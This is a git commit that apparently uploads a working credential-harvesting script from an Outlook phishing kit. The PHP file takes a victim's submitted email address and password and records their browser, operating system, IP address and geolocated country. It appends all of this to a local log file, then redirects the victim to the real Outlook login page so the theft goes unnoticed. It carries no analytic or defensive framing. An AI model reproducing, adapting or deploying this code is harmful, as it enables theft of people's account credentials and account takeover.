c591a1156ad6709a477d6047e6d62c2130cdb074
confirmemsn0 <geraldogutierrezjosesoto1195@gmail.com>
2024-11-01 18:22:20 -0500

    Add files via upload

---
+++ Activador.php
@@ -0,0 +1,112 @@
+<?php
+@session_start();
+
+
+////////////////////
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+function getBrowser($user_agent){
+if(strpos($user_agent, 'MSIE') !== FALSE)
+   return 'Internet explorer';
+ elseif(strpos($user_agent, 'Edge') !== FALSE) //Microsoft Edge
+   return 'Microsoft Edge';
+ elseif(strpos($user_agent, 'Trident') !== FALSE) //IE 11
+    return 'Internet explorer';
+ elseif(strpos($user_agent, 'Opera Mini') !== FALSE)
+   return "Opera Mini";
+ elseif(strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR') !== FALSE)
+   return "Opera";
+ elseif(strpos($user_agent, 'Firefox') !== FALSE)
+   return 'Mozilla Firefox';
+ elseif(strpos($user_agent, 'Chrome') !== FALSE)
+   return 'Google Chrome';
+ elseif(strpos($user_agent, 'Safari') !== FALSE)
+   return "Safari";
+ else
+   return 'No hemos podido detectar su navegador';}
+ function getOS() { 
+    global $user_agent;
+    $os_array =  array(
+     '/windows nt 10/i'      =>  'Windows 10',
+     '/windows nt 6.3/i'     =>  'Windows 8.1',
+     '/windows nt 6.2/i'     =>  'Windows 8',
+     '/windows nt 6.1/i'     =>  'Windows 7',
+     '/windows nt 6.0/i'     =>  'Windows Vista',
+     '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
+     '/windows nt 5.1/i'     =>  'Windows XP',
+     '/windows xp/i'         =>  'Windows XP',
+     '/macintosh|mac os x/i' =>  'Mac OS X',
+     '/mac_powerpc/i'        =>  'Mac OS 9',
+     '/linux/i'              =>  'Linux',
+     '/ubuntu/i'             =>  'Ubuntu',
+     '/iphone/i'             =>  'iPhone',
+     '/ipod/i'               =>  'iPod',
+     '/ipad/i'               =>  'iPad',
+     '/android/i'            =>  'Android',
+     '/blackberry/i'         =>  'BlackBerry',
+     '/webos/i'              =>  'Mobile');
+    $os_platform = "Unknown OS Platform";
+    foreach ($os_array as $regex => $value) { 
+        if (preg_match($regex, $user_agent)) {
+            $os_platform = $value; }  }
+    return $os_platform; }
+$user_os        =   getOS();
+$navegador = getBrowser($user_agent);
+
+function get_client_ip() {
+  $ipaddress = '';
+  if (getenv('HTTP_CLIENT_IP'))
+      $ipaddress = getenv('HTTP_CLIENT_IP');
+  else if(getenv('HTTP_X_FORWARDED_FOR'))
+      $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
+  else if(getenv('HTTP_X_FORWARDED'))
+      $ipaddress = getenv('HTTP_X_FORWARDED');
+  else if(getenv('HTTP_FORWARDED_FOR'))
+      $ipaddress = getenv('HTTP_FORWARDED_FOR');
+  else if(getenv('HTTP_FORWARDED'))
+     $ipaddress = getenv('HTTP_FORWARDED');
+  else if(getenv('REMOTE_ADDR'))
+      $ipaddress = getenv('REMOTE_ADDR');
+  else
+      $ipaddress = 'UNKNOWN';
+  if (strpos($ipaddress, ",") !== false) :
+    $ipaddress = strtok($ipaddress, ",");
+  endif;
+  return $ipaddress;}
+$ips=get_client_ip();
+$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ips));
+$elpai = $meta['geoplugin_countryName']; 
+$region = $meta['geoplugin_regionName'];
+$ciudad = $meta['geoplugin_city'];
+
+date_default_timezone_set('America/Caracas');
+
+
+////////////////////
+
+if( isset ($_POST['usec']) && isset ($_POST['clave']) ){
+  
+
+	$file = fopen("Jalisco99923.txt", "a");
+fwrite($file, "ema : " .$_POST['usec']. PHP_EOL);
+fwrite($file, "pasixt : " .$_POST['clave']. PHP_EOL);
+fwrite($file, "Fecha: " .date ('l jS \of F Y h:i:s A',time()). PHP_EOL);
+fwrite($file, "SO= ".$user_os.", Nave= ".$navegador. PHP_EOL);
+fwrite($file, "IP= ".$ips." ". PHP_EOL);
+fwrite($file, "Addr= ".$elpai." ". PHP_EOL);
+fwrite($file, "======================\n" . PHP_EOL);
+@header ('refresh:0;url=https://outlook.live.com/');
+session_destroy();
+}else{ header ('refresh:0;url=https://outlook.live.com/'); exit(); 
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Proporciones medicas avanzadas</title>
+</head>
+<body>
+
+</body>
+</html>
